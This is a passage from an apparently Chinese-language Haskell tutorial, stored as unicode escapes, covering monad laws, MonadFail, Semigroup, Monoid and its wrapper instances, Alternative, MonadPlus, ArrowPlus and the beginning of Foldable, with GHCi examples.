a)\uff0c\u76f8\u5f53\u4e8e\u76f4\u63a5\u5c06 a \u76f4\u63a5\u4f20\u5165\u51fd\u6570 k \u5c06\u5df2\u7ecf\u5305\u542b\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\u7ed1\u5b9a\u7ed9 return \u51fd\u6570\uff0c\u76f8\u5f53\u4e8e\u4fdd\u6301\u4e0d\u53d8 \u7b2c\u4e09\u4e2a\u5b9a\u5f8b\u662f\u7ed3\u5408\u5f8b\uff0c\u628a\u5b83\u5199\u6210\u66f4\u50cf\u7ed3\u5408\u5f8b\u7684\u8868\u793a\u65b9\u6cd5\u662f\uff1a (m >>= (\\x -> g x)) >>= h = m >>= (\\x -> g x >>= h) \u7ec4\u5408\u8fd0\u7b97\u7b26\uff08>=>\uff09\u5f62\u5f0f \u00b6 Control.Monad \u6a21\u5757\u4e2d\u8fd8\u5b9a\u4e49\u4e86\u51fd\u6570 >=> \uff08Kleisli-composition operator\uff09\uff1a infixr 1 >=> ( >=> ) :: Monad m => ( a -> m b ) -> ( b -> m c ) -> ( a -> m c ) f >=> g = \\ x -> f x >>= g \u4f7f\u7528 >=> \u8fd0\u7b97\u7b26\u53ef\u4ee5\u5c06\u4e24\u4e2a\u7528\u4e8e\u7ed1\u5b9a\u7684\u51fd\u6570\u7ed3\u5408\u5728\u4e00\u8d77\u3002\u7528\u5b83\u8868\u793a\u7684 Monad \u5b9a\u5f8b\u66f4\u52a0\u6e05\u6670\u76f4\u89c2\uff1a Left identity \uff1areturn >=> f = f Right identity \uff1af >=> return = f Associativity \uff1a(f >=> g) >=> h = f >=> (g >=> h) do-notation \u5f62\u5f0f \u00b6 Monad \u7684\u8fd9\u4e09\u4e2a\u5b9a\u5f8b\u8fd8\u53ef\u4ee5\u4f7f\u7528 do \u8bed\u53e5\u6765\u63cf\u8ff0\uff1a Left identity \uff1a do { x' <- return x ; f x' = do { f x } } Right identity \uff1a do { x <- m ; return x = do { m } } Associativity \uff1a do { y <- do { x <- m ; do { x <- m ; do { x <- m ; f x do { y <- f x ; y <- f x ; } = g y = g y g y } } } } Intuition \u00b6 Monad \u4e5f\u53ef\u4ee5\u5f88\u81ea\u7136\u5730\u770b\u6210 Applicative \u7684\u5347\u7ea7\u7248\uff0c\u6bd4\u5982 Applicative \u7684\u64cd\u4f5c\u5168\u90e8\u662f\u56fa\u5b9a\u7684\uff0c\u800c Monad \u7684\u64cd\u4f5c\u53ef\u4ee5\u5728\u4e2d\u9014\u7a81\u7136\u6539\u53d8 \u540c\u65f6 Monad \u4e5f\u5b8c\u6210\u4e86 Functor \u548c Applicative \u65e0\u6cd5\u5b8c\u6210\u7684\u64cd\u4f5c\u3002\u6bd4\u5982\u8981\u7528 fmap \u548c\u5b9e\u73b0 >>= \u51fd\u6570\uff08\u5373\u8fbe\u6210\u64cd\u4f5c m a -> (a -> m b) -> m b\uff09\uff0c\u5148\u5047\u8bbe f :: a -> m b\uff0c\u90a3\u4e48 fmap f \u7684\u7c7b\u578b\u5c31\u4f1a\u662f m a -> m (m b)\uff0c\u5c06 m a \u5e94\u7528\u5728 fmap f \u4e0a\u4f1a\u5f97\u5230\u7ed3\u679c m (m b)\uff0c\u800c\u4e0d\u662f m b\u3002\u4f46\u662f\u76ee\u524d\u53ea\u53ef\u4ee5\u4f7f\u7528 pure \u5c06\u4e00\u4e2a\u503c\u88c5\u5165\u4e0a\u4e0b\u6587\u4e2d\uff08a -> m a\uff09\uff0c\u800c\u6ca1\u6709\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u4ece\u4e0a\u4e0b\u6587\u4e2d\u63d0\u53d6\u503c\uff08m a -> a\uff09\u3002\u90a3\u4e48\u5c31\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u6765\u5b9e\u73b0\u8fd9\u4e2a\u64cd\u4f5c\u7684\u6548\u679c\uff08m (m b) -> m b\uff09\u3002\u56e0\u6b64 Monad \u7684\u53e6\u4e00\u4e2a\u7b49\u6548\u7684\u5b9a\u4e49\u65b9\u6cd5\u662f\uff1a class Applicative m => Monad' m where join :: m ( m a ) -> m a ( >>= ) :: m a -> ( a -> m b ) -> m b x >>= f = join $ fmap f x \u4f46\u662f\u5b9a\u4e49 >>= \u51fd\u6570\u4f1a\u66f4\u4e3a\u76f4\u89c2\u65b9\u4fbf\uff0c\u6240\u4ee5 Haskell \u91c7\u7528\u4e86\u7528 >>= \u51fd\u6570\u5b9a\u4e49 Monad \u7684\u65b9\u6cd5 \u540c\u65f6 Haskell \u8fd8\u63d0\u4f9b\u4e86 join \u51fd\u6570\u7684\u5b9a\u4e49\uff1a join :: Monad m => m ( m a ) -> m a join x = x >>= id \u5e38\u7528\u51fd\u6570 \u00b6 liftM & ap \u00b6 liftM :: Monad m => (a -> b) -> m a -> m b ap :: Monad m => m (a -> b) -> m a -> m b \u6240\u4ee5 liftM \u5176\u5b9e\u5c31\u662f fmap\u3001ap \u5c31\u662f <*>\uff0c\u4f46\u662f\u8001\u7248\u672c\u7684 GHC \u5b9a\u4e49 Monad \u5e76\u6ca1\u6709 Functor\u3001Applicative \u7684\u7ea6\u675f\uff0c\u6240\u4ee5\u5b9e\u73b0\u4e86 liftM\u3001ap\uff0c\u5e76\u4e14\u4fdd\u7559\u4e86\u8fd9\u4e2a\u540d\u5b57 \u56e0\u6b64\u4e00\u4e2a\u5355\u5b50\u4e5f\u53ef\u4ee5\u901a\u8fc7 pure = return \u3001 (<*>) = ap \u76f4\u63a5\u6210\u4e3a\u5e94\u7528\u51fd\u5b50\u7684\u5b9e\u4f8b sequence \u00b6 sequence :: Monad m => [m a] -> m [a] sequence \u7684\u4f5c\u7528\u663e\u800c\u6613\u89c1\uff0c\u800c\u4e14\u5728 IO \u90e8\u5206\u4e5f\u4f7f\u7528\u5230\u4e86\u3002\u4f46\u662f\u8fd9\u4e2a\u7248\u672c\u662f\u5728 GHC.Base \u6a21\u5757\u4e2d\u5b9a\u4e49\u7684\uff0c\u8fd8\u6709\u4e00\u4e2a\u66f4\u5e7f\u6cdb\u7684\u4f7f\u7528 Traversable \u7684\u5b9a\u4e49\u5728 Data.Traversable \u6a21\u5757\u4e2d replicateM \u00b6 replicateM :: Applicative m => Int -> m a -> m [a] mapM & forM \u00b6 mapM :: Monad m => (a -> m b) -> [a] -> m [b] forM :: Monad m => [a] -> (a -> m b) -> m [b] forM \u7684\u7528\u6cd5\u5728 IO \u90e8\u5206\u5df2\u7ecf\u8bf4\u8fc7\uff0cmapM \u548c forM \u90fd\u5728 Data.Traversable \u6a21\u5757\u4e2d\u6709\u5e7f\u6cdb\u7248\u672c \u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u51fd\u6570\uff1afilterM\u3001zipWithM\u3001foldM\u3001forever\uff0c\u901a\u8fc7\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\u7528\u6cd5\uff0c\u662f\u5c06\u539f\u6765\u4ec5\u4f7f\u7528\u4e0e\u5217\u8868\u7684\u51fd\u6570\u63d0\u5347\u81f3\u53ef\u4ee5\u9002\u7528\u4e8e\u6240\u6709\u5355\u5b50 \u5e76\u4e14\u5728\u51fd\u6570\u540d\u540e\u52a0\u4e0b\u5212\u7ebf\uff0c\u6bd4\u5982 sequence_\u3001mapM_\uff0c\u4f1a\u5ffd\u7565\u8fd4\u56de\u503c\uff08\u6700\u7ec8\u7ed3\u679c\u4e3a m () \uff09 =<< & >=> & <=< \u00b6 \uff08 >=> \u64cd\u4f5c\u7b26\u5728\u4e0a\u9762 Monad Laws \u90e8\u5206\u5df2\u7ecf\u7ed9\u51fa\u4e86\u5b9a\u4e49\uff09 - x >>= f = f =<< x - f >=> g = g <=< f MonadFail \u00b6 MonadFail \u5b9a\u4e49\u5728 Control.Monad.Fail \u6a21\u5757\u4e2d\uff1a class Monad m => MonadFail m where fail :: String -> m a \u5b83\u53ea\u8981\u6c42\u5728 Monad \u7684\u57fa\u7840\u4e0a\u5b9e\u73b0 fail \u51fd\u6570\uff0c\u63a5\u6536\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fd4\u56de\u4e00\u4e2a\u5355\u5b50\u3002\u8fd9\u4f1a\u4f7f\u5728 do \u8bed\u53e5\u4e2d\u4ea7\u751f\u9519\u8bef\u65f6\u76f4\u63a5\u53d8\u4e3a\u9519\u8bef\u503c\uff08\u7a7a\u503c\uff09\u4f7f\u6700\u7ec8\u7684\u8fd4\u56de\u503c\u4e3a\u9519\u8bef\u503c MonadFail \u5b9e\u4f8b \u00b6 instance MonadFail Maybe where fail _ = Nothing instance MonadFail [] where fail _ = [] instance MonadFail IO where fail = failIO Maybe \u548c [] \u7684 fail \u51fd\u6570\u90fd\u4e0e\u7b2c\u4e00\u4e2a\u53c2\u6570\u65e0\u5173\uff0c\u76f4\u63a5\u8fd4\u56de\u7a7a\u503c\uff08Nothing\u3001[]\uff09\uff1b\u800c IO \u7684 fail \u51fd\u6570\u76f4\u63a5\u4f7f\u7528 failIO\uff0c\u5b9e\u73b0\u65b9\u6cd5\u4e5f\u662f\u6df1\u5965\uff08\u63a5\u7740\u9003 exampleFail :: Maybe Char exampleFail = do ( x : xs ) <- Just \"\" return x ghci > exampleFail Nothing \u5728\u8fd9\u4e2a\u4f8b\u5b50\u7684 do \u8bed\u53e5\u4e2d\uff0c\u5728\u63d0\u53d6 Just \"\" \u4e2d\u7684\u503c\u65f6\u7528\u4e86\u6a21\u5f0f\u5339\u914d\uff0c\u4f46\u662f\u56e0\u4e3a\u5176\u5185\u5bb9\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0cx:xs \u5339\u914d\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u8fd9\u65f6\u5c31\u4f1a\u89e6\u53d1 fail \u51fd\u6570\u76f4\u63a5\u8fd4\u56de Nothing MonadFail Law \u00b6 fail s >>= m = fail s Semigroup \u00b6 \u534a\u7fa4\uff08semigroup\uff09\u662f\u4e00\u4e2a\u96c6\u5408 \\(S\\) \uff0c\u5b83\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26 \\(\\oplus\\) \uff0c\u5e76\u4e14\u6ee1\u8db3 \\[ a\\oplus b \\in S\\quad a, b\\in S \\] \u4ee5\u53ca\u7ed3\u5408\uff08associative\uff09\u5f8b\uff1a \\[ (a\\oplus b)\\oplus c = a\\oplus (b\\oplus c) \\] \u8fd9\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26\u5728 Haskell \u7684 Semigroup \u4e2d\u88ab\u5b9a\u4e49\u4e3a <> \u51fd\u6570\uff1a class Semigroup a where ( <> ) :: a -> a -> a sconcat :: NonEmpty a -> a sconcat ( a :| as ) = go a as where go b ( c : cs ) = b <> go c cs go b [] = b stimes :: Integarl b => b -> a -> a stimes = ... \u9664\u6b64\u4e4b\u5916\u8fd8\u6709 sconcat \u548c stimes \u51fd\u6570\uff0c\u90fd\u7ed9\u51fa\u4e86\u9ed8\u8ba4\u5b9e\u73b0\u3002\u5bf9\u4e8e\u5217\u8868\uff0c<> \u76f8\u5f53\u4e8e (++)\uff0cstimes \u76f8\u5f53\u4e8e concat . replicate\uff1a ghci > [ 1 , 2 ] <> [ 3 , 4 ] [ 1 , 2 , 3 , 4 ] ghci > sconcat $ fromList [[ 1 , 2 ], [ 3 , 4 ]] [ 1 , 2 , 3 , 4 ] ghci > stimes 3 [ 1 , 2 ] [ 1 , 2 , 1 , 2 , 1 , 2 ] Semigroup Law \u00b6 (x <> y) <> z = x <> (y <> z) \u8865\uff1aNonEmpty \u00b6 NonEmpty \u8868\u793a\u975e\u7a7a\u5217\u8868\uff0c\u5b9a\u4e49\u662f\uff1a data NonEmpty a = a :| [ a ] deriving ( Eq , Ord ) \u4f7f\u7528\u4e00\u4e2a\u5143\u7d20\u548c\u4e00\u4e2a\u5217\u8868\u7528 :| \u8fde\u63a5\u5c31\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a NonEmpty \u7c7b\u578b\u7684\u5217\u8868 Data.List.NonEmpty \u6a21\u5757\u4e2d\u5b9e\u73b0\u4e86\u5f88\u591a\u666e\u901a\u5217\u8868\u6709\u7684\u51fd\u6570\uff0c\u9700\u8981 qualified import \u540e\u8c03\u7528\uff0c\u4f7f\u7528 fromList\u3001toList \u51fd\u6570\u53ef\u4ee5\u5728\u666e\u901a\u5217\u8868\u548c\u975e\u7a7a\u5217\u8868\u4e4b\u95f4\u8f6c\u6362 ghci > import qualified Data.List.NonEmpty as NE ghci > arr = NE . fromList [ 1 , 2 , 3 ] ghci > arr 1 :| [ 2 , 3 ] ghci > NE . head arr 1 ghci > NE . tail arr [ 2 , 3 ] Monoid \u00b6 \u5e7a\u534a\u7fa4\uff08Monoid\uff09\u662f\u4e00\u4e2a\u6709\u5355\u4f4d\u5143\u7d20 \\(e\\) \u7684\u534a\u7fa4\uff0c\u5373 \\(e\\) \u6ee1\u8db3\uff1a \\[ e\\oplus x = x\\oplus e = x \\] class Semigroup a => Monoid a where mempty :: a mappend :: a -> a -> a mappend = ( <> ) mconcat :: [ a ] -> a mconcat = foldr mappend mempty \u53ef\u4ee5\u770b\u51fa Monoid \u8981\u6c42\u4e86\u4e09\u4e2a\u51fd\u6570\uff0c\u5176\u4e2d\u6700\u5c11\u53ea\u9700\u8981 mempty \uff0c\u5b83\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u8868\u793a\u5355\u4f4d\u5143\u7d20\u3002 mappend \u5373 Semigroup \u4e2d\u7684 <> \u8fd0\u7b97\u7b26\uff0c mconcat \u4e5f\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u5b9e\u73b0 Monoid \u5b9e\u4f8b \u00b6 [a] \u00b6 \u56e0\u4e3a Monoid \u7684\u5b9e\u4f8b\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u50cf Functor \u7b49\u4e00\u6837\u7b49\u7c7b\u578b\u6784\u9020\u5668\uff0c\u6240\u4ee5 [] \u5e76\u4e0d\u662f Monoid \u7684\u5b9e\u4f8b\uff0c\u4f46\u662f\u5177\u4f53\u7c7b\u578b [a] \u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a instance Semigroup [ a ] where ( <> ) = ( ++ ) instance Monoid [ a ] where mempty = [] mconcat xss = [ x | xs <- xss , x <- xs ] \u5217\u8868\u7684\u5355\u4f4d\u5143\u7d20\uff08mempty\uff09\u5c31\u662f\u7a7a\u5217\u8868 []\uff0c\u8fd0\u7b97\u7b26\u5c31\u662f\u5408\u5e76\u5217\u8868 (++)\uff0cmconcat \u4e5f\u7528\u5217\u8868\u63a8\u5bfc\u91cd\u65b0\u5b9e\u73b0\u63d0\u9ad8\u6548\u7387 ghci > mempty :: [ Int ] [] ghci > [ 1 , 2 ] <> [ 3 , 4 ] [ 1 , 2 , 3 , 4 ] ghci > [ 1 , 2 ] ` mappend ` [ 3 , 4 ] [ 1 , 2 , 3 , 4 ] ghci > mconcat [[ 1 , 2 ], [ 3 , 4 ]] [ 1 , 2 , 3 , 4 ] Ordering \u00b6 instance Semigroup Ordering where LT <> _ = LT EQ <> y = y GT <> _ = GT instance Monoid Ordering where mempty = EQ \u4e3b\u8981\u53ef\u4ee5\u7528\u4e8e\u6bd4\u8f83\u5b57\u5178\u5e8f\uff1a ghci > mconcat ( zipWith compare \"abcd\" \"acbd\" ) LT Sum & Product \u00b6 \u5bf9\u4e8e\u6570\u5b57\uff0c\u52a0\u6cd5\u548c\u4e58\u6cd5\u90fd\u6ee1\u8db3\u7ed3\u5408\u5f8b\uff0c\u6240\u4ee5\u5bf9\u4e8e Num\uff0c\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u4f46\u662f\u4e0d\u80fd\u4e3a\u540c\u4e00\u7c7b\u578b\u8bbe\u7f6e\u4e24\u79cd\u5b9e\u4f8b\u65b9\u5f0f\uff0c\u6240\u4ee5 Data.Monoid \u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5668\u2014\u2014\u2014\u2014 Sum \u548c Product\uff1a newtype Sum a = Sum { getSum :: a } deriving ( ... ) newtype Product a = Product { getProduct :: a } deriving ( ... ) \u5b83\u4eec\u4f7f\u7528 Sum \u6216 Product \u6765\u5305\u88c5\u8d77\u4e00\u4e2a\u6570\u5b57\uff0c\u53ef\u4ee5\u901a\u8fc7 getSum \u6216 getProduct \u6765\u83b7\u53d6\u5176\u4e2d\u7684\u503c \u5bf9\u4e8e\u52a0\u6cd5\uff0c\u4e8c\u5143\u64cd\u4f5c\u4e3a (+)\uff0c\u5355\u4f4d\u5143\u7d20\u4e3a 0\uff1b\u5bf9\u4e8e\u4e58\u6cd5\uff0c\u4e8c\u5143\u64cd\u4f5c\u4e3a (*)\uff0c\u5355\u4f4d\u5143\u7d20\u4e3a 1: instance Num a => Semigroup ( Sum a ) where ( <> ) = coerce (( + ) :: a -> a -> a ) instance Num a => Monoid ( Sum a ) where mempty = Sum 0 instance Num a => Semigroup ( Product a ) where ( <> ) = coerce (( * ) :: a -> a -> a ) instance Num a => Monoid ( Product a ) where mempty = Product 1 ghci > Sum 5 <> Sum 6 <> Sum 10 Sum { getSum = 21 } ghci > getSum . mconcat . fmap Sum $ [ 5 , 6 , 10 ] 21 ghci > Product 5 <> Product 6 <> Product 10 Product { getProduct = 300 } ghci > getProduct . mconcat . fmap Product $ [ 5 , 6 , 10 ] 300 All & Any \u00b6 \u548c\u6570\u5b57\u4e00\u6837\uff0c\u5e03\u5c14\u503c\u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u56e0\u6b64 Data.Monoid \u6a21\u5757\u4e2d\u4e5f\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5668\uff0c\u5206\u522b\u5b9e\u73b0\u4e86\u8fd9\u4e24\u79cd Monoid\uff1a newtype All = All { getAll :: Bool } deriving ( ... ) instance Semigroup All where ( <> ) = coerce ( && ) instance Monoid All where mempty = All True newtype Any = Any { getAny :: Bool } deriving ( ... ) instance Semigroup Any where ( <> ) = coerce ( || ) instance Monoid Any where mempty = Any False ghci > getAll ( All True <> mempty <> All False ) False ghci > getAll ( mconcat ( map ( \\ x -> All ( even x )) [ 2 , 4 , 6 , 7 , 8 ])) False ghci > getAny ( Any True <> mempty <> Any False ) True ghci > getAny ( mconcat ( map ( \\ x -> Any ( even x )) [ 2 , 4 , 6 , 7 , 8 ])) True Monoid a => Maybe a \u00b6 \u5982\u679c a \u662f\u4e00\u4e2a(\u5e7a)\u534a\u7fa4\uff0c\u90a3\u4e48 Maybe a \u4e5f\u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff0c\u5355\u4f4d\u5143\u5c31\u662f Nothing\uff1a instance Semigroup a => Semigroup ( Maybe a ) where Nothing <> b = b a <> Nothing = a Just a <> Just b = Just ( a <> b ) instance Semigroup a => Monoid ( Maybe a ) where mempty = Nothing ghci > Nothing <> Just \"andy\" Just \"andy\" ghci > Just LT <> Nothing Just LT ghci > Just ( Sum 3 ) <> Just ( Sum 4 ) Just ( Sum { getSum = 7 }) First & Last \u00b6 \u5bf9\u4e8e Maybe \u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u6cd5\uff0c\u5373 <> \u64cd\u4f5c\u6bcf\u6b21\u6052\u53d6\u5de6\u8fb9\u548c\u6bcf\u6b21\u6052\u53d6\u53f3\u8fb9\uff08\u5728\u6ca1\u6709 Nothing \u7684\u60c5\u51b5\u4e0b\uff09\uff0c\u6240\u4ee5 Data.Monoid \u6a21\u5757\u4e2d\u4e5f\u63d0\u4f9b\u4e86\u4e24\u4e2a\u65b0\u7684\u5305\u88c5\u5668\uff1aFirst \u548c Last\uff1a newtype First a = First { getFirst :: Maybe a } deriving ( ... ) instance Semigroup ( First a ) where First Nothing <> b = b a <> _ = a instance Monoid ( First a ) where mempty = First Nothing newtype Last a = Last { getLast :: Maybe a } deriving ( ... ) instance Semigroup ( Last a ) where a <> Last Nothing = a _ <> b = b instance Monoid ( Last a ) where mempty = Last Nothing ghci > getFirst ( First ( Just \"hello\" ) <> First Nothing <> First ( Just \"world\" )) Just \"hello\" ghci > getLast ( Last ( Just \"hello\" ) <> Last Nothing <> Last ( Just \"world\" )) Just \"world\" ghci > getFirst . mconcat . map First $ [ Nothing , Just 9 , Just 10 ] Just 9 ghci > getLast . mconcat . map Last $ [ Nothing , Just 9 , Just 10 ] Just 10 Min & Max \u00b6 \u5bf9\u4e8e\u6709\u754c\u7684\u7c7b\u578b\uff0c\u4e5f\u6709\u4e24\u79cd\u5b9e\u73b0 Monoid \u7684\u65b9\u5f0f\uff0c\u6bcf\u6b21\u4e8c\u5143\u64cd\u4f5c\u90fd\u53d6\u6700\u5c0f\u6216\u6700\u5927\u3002 Data.Semigroup \u6a21\u5757\u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u5305\u88c5\u5176\u5668\uff1aMin \u548c Max\uff1a newtype Min a = Min { getMin :: a } deriving ( ... ) instance Ord a => Semigroup ( Min a ) where ( <> ) = coerce ( min :: a -> a -> a ) instance ( Ord a , Bounded a ) => Monoid ( Min a ) where mempty = maxBound newtype Max a = Max { getMax :: a } deriving ( ... ) instance Ord a => Semigroup ( Max a ) where ( <> ) = coerce ( max :: a -> a -> a ) instance ( Ord a , Bounded a ) => Monoid ( Max a ) where mempty = minBound ghci > Min 3 <> Min 5 Min { getMin = 3 } ghci > Max 3 <> Max 5 Max { getMax = 5 } ghci > getMin . mconcat . map Min $ [ 1 , 2 , 3 ] :: Int 1 ghci > getMax . mconcat . map Max $ [ 1 , 2 , 3 ] :: Int 3 \u5143\u7ec4 \u00b6 \u5f53\u5143\u7ec4\u5185\u7684\u6240\u6709\u5143\u7d20\u90fd\u662f\u5e7a\u534a\u7fa4\u65f6\uff0c\u6574\u4e2a\u5143\u7ec4\u4e5f\u662f\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a instance ( Semigroup a , Semigroup b ) => Semigroup ( a , b ) where ( a , b ) <> ( a' , b' ) = ( a <> a' , b <> b' ) stimes n ( a , b ) = ( stimes n a , stimes n b ) instance ( Monoid a , Monoid b ) => Monoid ( a , b ) where mempty = ( mempty , mempty ) ghci > mconcat $ map ( \\ x -> ( Min x , Max x )) [ 1 .. 10 ] :: ( Min Int , Max Int ) ( Min { getMin = 1 }, Max { getMax = 10 }) Monoid Laws \u00b6 mempty <> x = x x <> mempty = x (x <> y) <> z = x <> (y <> z) Monoidal classes \u00b6 Applicative\u3001Monad\u3001Arrow \u90fd\u6709\u6709\u5e7a\u534a\u7fa4\u6027\u8d28\u7684\u5b50\u7c7b\u578b\u7c7b\uff0c\u5206\u522b\u662f Alternative\u3001MonadPlus\u3001ArrowPlus Alternative \u00b6 class Applicative f => Alternative f where -- | The identity of '<|>' empty :: f a -- | An associative binary operation ( <|> ) :: f a -> f a -> f a some :: f a -> f [ a ] some v = ( : ) <$> v <*> many v many :: f a -> f [ a ] many v = some v <|> pure [] \u5176\u4e2d empty \u662f\u5e7a\u534a\u7fa4\u4e2d\u7684\u5355\u4f4d\u5143\u7d20\uff0c<|> \u662f\u5e7a\u534a\u7fa4\u4e2d\u7684\u4e8c\u5143\u8fd0\u7b97\u7b26\u3002some \u548c many \u662f\u4e24\u4e2a\u51fd\u6570\uff08 \u610f\u4e49\u8fd8\u4e0d\u61c2 \uff09 Alternative \u5b9e\u4f8b \u00b6 [] \u00b6 instance Alternative [] where empty = [] ( <|> ) = ( ++ ) \u548c Monoid \u4e00\u6837\uff0c\u5355\u4f4d\u5143\u7d20\u662f\u7a7a\u5217\u8868\uff0c\u4e8c\u5143\u8fd0\u7b97\u662f\u5217\u8868\u5408\u5e76 ghci > [ 1 , 2 , 3 ] <|> empty <|> [ 4 , 5 ] [ 1 , 2 , 3 , 4 , 5 ] ghci > some [] [] ghci > many [] [ [] ] Maybe \u00b6 instance Alternative Maybe where empty = Nothing Nothing <|> r = r l <|> _ = l Maybe \u4f5c\u4e3a Alternative \u7684\u5355\u4f4d\u5143\u7d20\u662f Nothing\uff0c\u4e8c\u5143\u8fd0\u7b97\u662f\u59cb\u7ec8\u53d6\u5de6\u8fb9\uff08\u5f53\u5de6\u8fb9\u4e0d\u4e3a Nothing \u65f6\uff09 ghci > Nothing <|> Just 1 <|> Just 2 Just 1 ghci > some Nothing Nothing ghci > many Nothing Just [] ZipList \u00b6 instance Alternative ZipList where empty = ZipList [] ZipList xs <|> ZipList ys = ZipList ( xs ++ drop ( length xs ) ys ) <> getZipList $ ZipList [ 1 , 2 ] <|> ZipList [ 3 , 4 , 5 , 6 ] [ 1 , 2 , 5 , 6 ] <> getZipList $ ZipList [ 1 , 2 , 3 , 4 ] <|> ZipList [ 3 , 4 , 5 , 6 ] [ 1 , 2 , 3 , 4 ] Alternative Laws \u00b6 Monoid laws : empty <|> x = x x <|> empty = x ( x <|> y ) <|> z = x <|> ( y <|> z ) Left zero law \uff1aempty <*> f = empty \u4ee5\u4e0a\u7684\u5b9a\u5f8b\u662f\u90fd\u6ee1\u8db3\u90fd\uff0c\u4e0b\u9762\u7684\u5b9a\u5f8b\u53ea\u6709\u90e8\u5206\u6ee1\u8db3\uff1a Right zero law \uff1af <*> empty = empty \uff08\u5927\u90e8\u5206\u5305\u62ec Maybe\u3001[] \u6ee1\u8db3\uff0cIO \u4e0d\u6ee1\u8db3\uff09 Left distribution \uff1a(a <|> b) < > c = (a < > c) <|> (b <*> c) \uff08Maybe\u3001[] \u6ee1\u8db3\uff0cIO \u53ca\u5927\u90e8\u5206 parsers \u4e0d\u6ee1\u8db3\uff09 Right distribution \uff1aa < > (b <|> c) = (a < > b) <|> (a <*> c) \uff08\u5927\u90e8\u5206\u4e0d\u6ee1\u8db3\uff0c\u4f46 Maybe \u6ee1\u8db3\uff09 Left catch \uff1a(pure a) <|> x = pure a \uff08Maybe\u3001IO\u3001parsers \u6ee1\u8db3\uff0c\u4f46 [] \u4e0d\u6ee1\u8db3\uff09 \u5e38\u7528\u51fd\u6570 \u00b6 asum :: (Foldable t, Alternative f) => t (f a) -> f a\uff0c\u76f8\u5f53\u4e8e foldr (<|>) empty\uff1a ghci > asum [ Nothing , Just 5 , Just 3 ] Just 5 ghci > asum [[ 2 ],[ 3 ],[ 4 , 5 ]] [ 2 , 3 , 4 , 5 ] guard :: (Alternative f) => Bool -> f ()\uff1a guard True = pure () guard False = empty MonadPlus \u00b6 class ( Alternative m , Monad m ) => MonadPlus m where mzero :: m a mzero = empty mplus :: m a -> m a -> m a mplus = ( <|> ) MonadPlus\u5b9e\u4f8b \u00b6 []\u3001Maybe \u90fd\u662f MonadPlus \u7684\u5b9e\u4f8b\uff0cmzero \u548c mplus \u90fd\u7531 Alternative \u5b9e\u73b0 MonadPlus Laws \u00b6 Monoid laws Left zero \uff1amzero >>= f = mzero Right zero \uff1am >> mzero = mzero \u5e38\u7528\u51fd\u6570 \u00b6 msum = asum mfilter \uff1a mfilter p ma = do a <- ma if p a then return a else mzero ArrowPlus \u00b6 ArrowZero \u548c ArrowPlus \u5206\u522b\u4e3a Arrow \u8bbe\u7f6e\u4e86 Monoid \u4e2d\u7684\u5355\u4f4d\u5143\u7d20\u548c\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0c\u4f7f\u4e4b\u6210\u4e3a\u4e86\u4e00\u4e2a\u5e7a\u534a\u7fa4\uff1a class Arrow arr => ArrowZero arr where zeroArrow :: b ` arr ` c class ArrowZero arr => ArrowPlus arr where ( <+> ) :: ( b ` arr ` c ) -> ( b ` arr ` c ) -> ( b ` arr ` c ) \u4e00\u4e9b\u5176\u5b83 Typeclasses \u00b6 Foldable \u00b6 Foldable \u662f\u8868\u793a\u53ef\u4ee5\u6298\u53e0\uff08fold\uff09\u7684\u7c7b\u578b\u7c7b\uff0c\u5728 Data.Foldable \u4e2d\u5b9a\u4e49\uff0c\u8fd9\u4f7f\u5f97\u548c fold \u76f8\u5173\u7684\u51fd\u6570\u53ef\u4ee5\u7528\u5728\u4efb\u610f Foldable \u7684\u5b9e\u4f8b\u7c7b\u578b\u4e0a\u3002\u5b83\u7684\u5b9a\u4e49\u662f\uff1a class Foldable t where fold :: Monoid m => t m -> m foldMap :: Monoid m => ( a -> m ) -> t a -> m foldMap' :: Monoid m => ( a -> m ) -> t a -> m foldr :: ( a -> b -> b ) -> b -> t a -> b foldr' :: ( a -> b -> b ) -> b -> t a -> b foldl :: ( b -> a -> b ) -> b -> t a -> b foldl' :: ( b -> a -> b ) -> b -> t a -> b foldr1 :: ( a -> a -> a ) -> t a -> a foldl1 :: ( a -> a -> a ) -> t a -> a toList :: t a -> [ a ] null :: t a -> Bool length :: t a -> Int elem :: Eq a => a -> t a -> Bool maximum :: Ord a => t a -> a minimum :: Ord a => t a -> a sum :: Num a => t a -> a product :: Num a => t a -> a {-# MINIMAL foldMap | foldr #-} \u6700\u5c11\u53ea\u8981\u5b9e\u73b0 foldr \u548c foldMap \u5176\u4e2d\u4e4b\u4e00\u5c31\u53ef\u4ee5\u4f7f\u4e00\u4e2a\u7c7b\u578b\u6210\u4e3a Foldable 